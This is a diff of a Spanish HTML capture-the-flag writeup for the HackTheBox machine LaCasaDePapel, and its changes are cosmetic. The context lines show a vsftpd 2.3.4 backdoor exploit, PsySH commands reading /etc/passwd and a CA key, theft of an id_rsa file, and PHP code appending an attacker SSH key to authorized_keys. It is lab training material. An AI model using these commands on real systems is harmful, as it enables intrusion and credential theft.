@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,11 +1578,11 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">#cron</a></li>
+
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">#ftp</a></li>
 
   <li><a href="https://sckull.github.io/tags/openssl/" class="single__tag" title="openssl">#openssl</a></li>
-
-  <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">#cron</a></li>
 
 </ul>
     </div>
@@ -1633,7 +1633,7 @@
 </tbody>
 </table>
 <hr />
-<h2 id="masscan">MASSCAN</h2>
+<h2 id="masscan-">MASSCAN</h2>
 <p>Escaneo de todos los puertos tcp/udp.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1661,7 +1661,7 @@ Discovered open port 80/tcp on 10.10.10.131
 Discovered open port 21/tcp on 10.10.10.131
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="nmap">NMAP</h2>
+</div><h2 id="nmap-">NMAP</h2>
 <p>Escaneo de puertos encontrados con MASSCAN.</p>
 <pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 00:48 BST
 Nmap scan report for 10.10.10.131
@@ -1691,13 +1691,13 @@ Service Info: OS: Unix
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 </code></pre><p>Agregamos lacasadepapel.htb a nuestro archivo <code>/etc/hosts</code>.</p>
-<h2 id="https">HTTPS</h2>
+<h2 id="https-">HTTPS</h2>
 <p>Al visitar la pagina en https nos muestra un error de certificado.</p>
 <p><img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2018.01.04.webp" alt="image" /></p>
-<h2 id="http">HTTP</h2>
+<h2 id="http-">HTTP</h2>
 <p>Al visitar la pagina nos muestra una imagen QR.<br />
 <img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-03-31%2023.41.33.webp" alt="image" /></p>
-<h2 id="ftp">FTP</h2>
+<h2 id="ftp-">FTP</h2>
 <p>Encontramos ftp en su version <code>vftpd 2.3.4</code> el cual tiene una vulnerabilidad de backdoor, utilizamos exploit escrito en python para ejecutar comandos, cuando lo ejecutamos nos muestra un mensaje de <code>Psy Shell</code>, intentamos conectarnos al <code>puerto 6200</code>, y encontramos una shell de Psysh,y con el comando dir la clase <code>$tokyo</code>.</p>
 <p><a href="https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/"><em>Expliting Vsftpd</em></a></p>
 <p><a href="https://github.com/In2econd/vsftpd-2.3.4-exploit"><em>Github - Exploit</em></a></p>
@@ -1716,14 +1716,14 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Tokyo</span> <span class="p">{</span>
-	<span class="k">private</span> <span class="k">function</span> <span class="nf">sign</span><span class="p">(</span><span class="nv">$caCert</span><span class="p">,</span><span class="nv">$userCsr</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="nv">$caKey</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/home/nairobi/ca.key&#39;</span><span class="p">);</span>
-    	<span class="nv">$userCert</span> <span class="o">=</span> <span class="nx">openssl_csr_sign</span><span class="p">(</span><span class="nv">$userCsr</span><span class="p">,</span> <span class="nv">$caCert</span><span class="p">,</span> <span class="nv">$caKey</span><span class="p">,</span> <span class="mi">365</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;digest_alg&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;sha256&#39;</span><span class="p">]);</span>
-    	<span class="nx">openssl_x509_export</span><span class="p">(</span><span class="nv">$userCert</span><span class="p">,</span> <span class="nv">$userCertOut</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="nv">$userCertOut</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
+<pre class="chroma"><code class="language-php" data-lang="php">class Tokyo {
+	private function sign($caCert,$userCsr) {
+    	$caKey = file_get_contents(&#39;/home/nairobi/ca.key&#39;);
+    	$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [&#39;digest_alg&#39;=&gt;&#39;sha256&#39;]);
+    	openssl_x509_export($userCert, $userCertOut);
+    	return $userCertOut;
+    }
+}
 </code></pre></td></tr></table>
 </div>
 </div><p>Al parecer es una clase que crea un certificado para tener acceso a la pagina en https, vamos a generar el nuestro utilizando la key (ca.key) que utiliza la funcion. Para leer este archiv utilizamos: <code>file_get_contents(archivo)</code>.</p>
@@ -1759,7 +1759,7 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 <p><img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2002.10.15.webp" alt="image" /></p>
 <p>Asi es como obtenemos el archivo <code>/etc/passwd</code>, ahora que sabemos como descargar archivos vamos a descargar el <code>id_rsa</code> (<code>../.ssh/id_rsa</code>) del usuario <code>berlin</code> y asi conectarnos mediante el servicio ssh.</p>
 <p>Por alguna razon el <code>id_rsa</code> del usuario <code>berlin</code> no funciona en si mismo, funciona con el usuario <code>professor</code> y <code>dali</code>. En el caso de dali debemos de agregar nuestra clave al archivo <code>authorized_keys</code> mediante <code>PSYSH</code>.</p>
-<h2 id="usuario-dali-psysh">USUARIO DALI PSYSH</h2>
+<h2 id="usuario-dali-psysh-">USUARIO DALI PSYSH</h2>
 <p><a href="https://www.sitepoint.com/interactive-php-debugging-psysh/"><em>Debugging Psysh</em></a></p>
 <p>Utilizando psysh en el puerto 6200 mediante telnet podemos leer y escribir archivos, en este caso vamos a leer el archivo /etc/passwd.</p>
 <pre><code>$file = file_get_contents('/etc/passwd');echo $file;
@@ -1774,20 +1774,20 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$text</span> <span class="o">=</span> <span class="s2">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull&#34;</span><span class="p">;</span><span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;/home/dali/.ssh/authorized_keys&#34;</span><span class="p">;</span><span class="nv">$fh</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">);</span><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fh</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span><span class="nx">fclose</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>
+<pre class="chroma"><code class="language-php" data-lang="php">$text = &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull&#34;;$filename = &#34;/home/dali/.ssh/authorized_keys&#34;;$fh = fopen($filename, &#34;a&#34;);fwrite($fh, $text);fclose($fh);
 </code></pre></td></tr></table>
 </div>
 </div><p>Escribimos y verificamos.<br />
 <img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.31.07.webp" alt="image" /></p>
 <p>Ahora nos conectamos con la clave de &lsquo;berlin&rsquo;.<br />
 <img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.27.12.webp" alt="image" /></p>
-<h2 id="usuario-professor---ssh">USUARIO PROFESSOR - SSH</h2>
+<h2 id="usuario-professor---ssh-">USUARIO PROFESSOR - SSH</h2>
 <p>Para el usuario professor utilizamos la misma clave para conectarnos y obtenemos una sesion ssh.<br />
 <img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.29.01.webp" alt="image" /></p>
-<h2 id="user---flag">USER - FLAG</h2>
+<h2 id="user---flag-">USER - FLAG</h2>
 <p>Al enumerar las carpetas de los usuarios encontramos nuestra bandera <code>user.txt</code> en la carpeta de berlin, para obtenernuestra bandera encodeamos la direccion en base64 y la descargamos de la misma forma que la clave de berlin.</p>
 <p><img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.38.06.webp" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Utilizamos pspy64 para ver los crons que se ejecutan.<br />
 <img src="/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.52.46.webp" alt="image" /></p>
 <p>Encontramos un proceso que se ejecuta que utiliza node y un archivo <code>memcached.js</code>.<br />
@@ -3176,7 +3176,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3224,15 +3224,15 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#masscan">MASSCAN</a></li>
-        <li><a href="#nmap">NMAP</a></li>
-        <li><a href="#https">HTTPS</a></li>
-        <li><a href="#http">HTTP</a></li>
-        <li><a href="#ftp">FTP</a></li>
-        <li><a href="#usuario-dali-psysh">USUARIO DALI PSYSH</a></li>
-        <li><a href="#usuario-professor---ssh">USUARIO PROFESSOR - SSH</a></li>
-        <li><a href="#user---flag">USER - FLAG</a></li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#masscan-">MASSCAN</a></li>
+        <li><a href="#nmap-">NMAP</a></li>
+        <li><a href="#https-">HTTPS</a></li>
+        <li><a href="#http-">HTTP</a></li>
+        <li><a href="#ftp-">FTP</a></li>
+        <li><a href="#usuario-dali-psysh-">USUARIO DALI PSYSH</a></li>
+        <li><a href="#usuario-professor---ssh-">USUARIO PROFESSOR - SSH</a></li>
+        <li><a href="#user---flag-">USER - FLAG</a></li>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
       </ul>
     </li>
   </ul>
